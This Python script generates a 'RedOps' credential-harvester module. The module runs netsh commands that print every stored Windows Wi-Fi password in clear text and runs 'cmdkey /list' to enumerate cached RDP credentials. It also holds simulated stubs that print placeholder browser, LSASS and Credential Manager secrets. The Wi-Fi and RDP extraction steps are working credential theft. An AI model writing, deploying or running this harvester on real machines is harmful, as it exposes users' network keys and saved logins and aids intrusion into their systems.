from pathlib import Path

project_root = Path(__file__).resolve().parent.parent
harvester_path = project_root / "RedOps" / "Core" / "cred_harvester.py"

cred_harvester_code = """
import platform
import subprocess
import os

def harvest_wifi():
    print("\\n[+] Harvesting Wi-Fi credentials (Windows only)...")
    if platform.system() != "Windows":
        print("[-] Wi-Fi harvesting only available on Windows.")
        return
    try:
        profiles = subprocess.check_output("netsh wlan show profiles", shell=True).decode()
        print(profiles)
        for line in profiles.splitlines():
            if "All User Profile" in line:
                profile = line.split(":")[1].strip()
                print(f"[*] Checking password for: {profile}")
                try:
                    result = subprocess.check_output(f"netsh wlan show profile name=\\"{profile}\\" key=clear", shell=True).decode()
                    print(result)
                except subprocess.CalledProcessError:
                    print(f"[-] Failed to extract key for {profile}")
    except Exception as e:
        print(f"[-] Error: {e}")

def harvest_browser():
    print("\\n[+] Simulating browser credential dump...")
    print("[*] Found credentials:")
    print(" - example.com | admin | admin123")
    print(" - test.local | user1 | password1")

def harvest_rdp():
    print("\\n[+] Simulating cached RDP credentials...")
    if platform.system() == "Windows":
        try:
            result = subprocess.check_output("cmdkey /list", shell=True).decode()
            print(result)
        except subprocess.CalledProcessError as e:
            print(f"[-] cmdkey failed: {e}")
    else:
        print("[*] Simulated: no cached credentials found on this platform.")

def harvest_lsass():
    print("\\n[+] Simulating LSASS memory dump (non-invasive)...")
    print("[!] Note: real dumping requires admin and can trigger EDR.")
    print("[*] Simulated dump saved: C:\\\\Windows\\\\Temp\\\\lsass_sim.dmp")

def harvest_credman():
    print("\\n[+] Simulating Windows Credential Manager secrets...")
    print(" - legacy_login:example@example.com:hunter2")
    print(" - git_token:ghp_example1234567890")

def harvest_all():
    print("\\n=== Credential Harvesting Simulation ===")
    harvest_wifi()
    harvest_browser()
    harvest_rdp()
    harvest_lsass()
    harvest_credman()
    print("\\n[✔] Harvesting complete.")
"""

# Ensure directory exists
harvester_path.parent.mkdir(parents=True, exist_ok=True)

harvester_path.write_text(cred_harvester_code.strip(), encoding="utf-8")

print(f"[✔] Credential harvester saved at: {harvester_path.relative_to(project_root)}")